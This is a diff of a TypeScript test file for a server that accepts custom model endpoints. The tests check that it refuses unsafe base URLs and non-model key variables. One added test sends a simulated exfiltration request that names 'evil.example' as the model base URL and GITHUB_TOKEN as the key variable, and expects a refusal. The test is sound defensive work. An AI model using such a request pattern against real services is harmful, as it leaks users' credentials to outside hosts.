@@ -51,9 +51,9 @@ test("a custom OpenAI-compatible model is resolved and honoured; only the env-va
   const mock = await mockOpenAi();
   const c = await boot();
   const SECRET = "sk-fake-supersecret-value-9999";
-  process.env.CRENEL_TEST_KEY = SECRET;
+  process.env.CRENEL_LLM_TEST_KEY = SECRET;
   try {
-    const res = await c.post("/api/runs", { prompt: "bonjour, résume l'état", mode: "readonly", model: "openai:test-model", modelBaseUrl: mock.url, modelApiKeyEnv: "CRENEL_TEST_KEY" });
+    const res = await c.post("/api/runs", { prompt: "bonjour, résume l'état", mode: "readonly", model: "openai:test-model", modelBaseUrl: mock.url, modelApiKeyEnv: "CRENEL_LLM_TEST_KEY" });
     assert.equal(res.status, 201, await res.clone().text());
     const { id } = await res.json() as { id: string };
     const run = c.srv.runs.get(id)!;
@@ -78,7 +78,7 @@ test("a custom OpenAI-compatible model is resolved and honoured; only the env-va
     const state = await (await c.get("/api/state")).json() as { customProviders: string[] };
     assert.deepEqual(state.customProviders, ["openai", "ollama", "anthropic-api"]);
   } finally {
-    delete process.env.CRENEL_TEST_KEY;
+    delete process.env.CRENEL_LLM_TEST_KEY;
     await c.close();
     await mock.close();
   }
@@ -90,9 +90,57 @@ test("a bad custom model is a clear 4xx, with no secret disclosed", async () => 
     assert.equal((await c.post("/api/runs", { prompt: "x", model: "bogus:thing" })).status, 400, "unknown provider");
     assert.equal((await c.post("/api/runs", { prompt: "x", model: "openai:m", modelApiKeyEnv: "lower_case" })).status, 400, "env var name must be upper-case");
     assert.equal((await c.post("/api/runs", { prompt: "x", model: "openai:m", modelBaseUrl: "not a url" })).status, 400, "base URL must be valid");
+    // The server would read the named variable and send it to the base URL:
+    // only model-key variables, https (or loopback), no credentials in the URL.
+    process.env.GITHUB_TOKEN_FOR_TEST = "ghp_should_never_leave";
+    const exfil = await c.post("/api/runs", { prompt: "x", model: "openai:m", modelBaseUrl: "https://evil.example", modelApiKeyEnv: "GITHUB_TOKEN" });
+    assert.equal(exfil.status, 400, "a non-model env var is refused");
+    assert.match(await exfil.text(), /not a model key variable/);
+    assert.equal((await c.post("/api/runs", { prompt: "x", model: "openai:m", modelBaseUrl: "http://models.example.com/v1" })).status, 400, "plain http only to localhost");
+    assert.equal((await c.post("/api/runs", { prompt: "x", model: "openai:m", modelBaseUrl: "https://u:p@models.example.com/v1" })).status, 400, "no credentials in the URL");
+    assert.equal((await c.post("/api/runs", { prompt: "x", model: "openai:m", modelTemperature: 3 })).status, 400, "temperature out of range");
+    assert.equal((await c.post("/api/runs", { prompt: "x", model: "openai:m", modelTemperature: "hot" })).status, 400, "temperature must be a number");
+    delete process.env.GITHUB_TOKEN_FOR_TEST;
     // A plain built-in name is unchanged: no model available here, the run still starts.
     assert.equal((await c.post("/api/runs", { prompt: "x", model: "opus" })).status, 201);
   } finally { await c.close(); }
+});
+
+test("a remote scan target cannot be the model endpoint; a provider key name and the temperature reach the provider", async () => {
+  const dir = mkdtempSync(join(tmpdir(), "crenel-cm-"));
+  const cfg = join(dir, "crenel.config.yaml");
+  writeFileSync(cfg, `project: t\nprojectDir: .\nscope:\n  allowedHosts: [app.example.com]\nchecks: []\n`);
+  const srv = await startServer({ configPath: cfg, port: 0, token: "tk", webDir: null, llm: "auto", claudeAvailable: false, checks: [] });
+  const post = (body: unknown) => fetch(`${srv.url}/api/runs`, { method: "POST", headers: { authorization: "Bearer tk", "content-type": "application/json" }, body: JSON.stringify(body) });
+  const seen: { url?: string; temperature?: number; auth?: string }[] = [];
+  const mock = createServer((req, res) => {
+    let body = ""; req.on("data", (c) => (body += c));
+    req.on("end", () => {
+      seen.push({ url: req.url, temperature: JSON.parse(body).temperature, auth: req.headers.authorization });
+      res.writeHead(200, { "content-type": "application/json" });
+      res.end(JSON.stringify({ choices: [{ message: { content: "ok" } }] }));
+    });
+  });
+  await new Promise<void>((r) => mock.listen(0, "127.0.0.1", () => r()));
+  const port = (mock.address() as { port: number }).port;
+  process.env.OPENROUTER_API_KEY = "or-test";
+  try {
+    const target = await post({ prompt: "x", model: "openai:m", modelBaseUrl: "https://app.example.com/v1" });
+    assert.equal(target.status, 400);
+    assert.match(await target.text(), /scan target/);
+    // A base that already ends in /v1, as the console's presets give it: no /v1/v1.
+    const res = await post({ prompt: "bonjour", mode: "readonly", model: "openai:m", modelBaseUrl: `http://127.0.0.1:${port}/v1`, modelApiKeyEnv: "OPENROUTER_API_KEY", modelTemperature: 0.3 });
+    assert.equal(res.status, 201, await res.clone().text());
+    const { id } = await res.json() as { id: string };
+    const run = srv.runs.get(id)!;
+    await wait(() => seen.length > 0 || run.status === "error");
+    assert.equal(seen[0]?.url, "/v1/chat/completions");
+    assert.equal(seen[0]?.temperature, 0.3);
+    assert.equal(seen[0]?.auth, "Bearer or-test");
+  } finally {
+    delete process.env.OPENROUTER_API_KEY;
+    await srv.close(); await new Promise<void>((r) => mock.close(() => r())); rmSync(dir, { recursive: true, force: true });
+  }
 });
 
 test("when the server is started with --llm off, a custom model is refused", async () => {
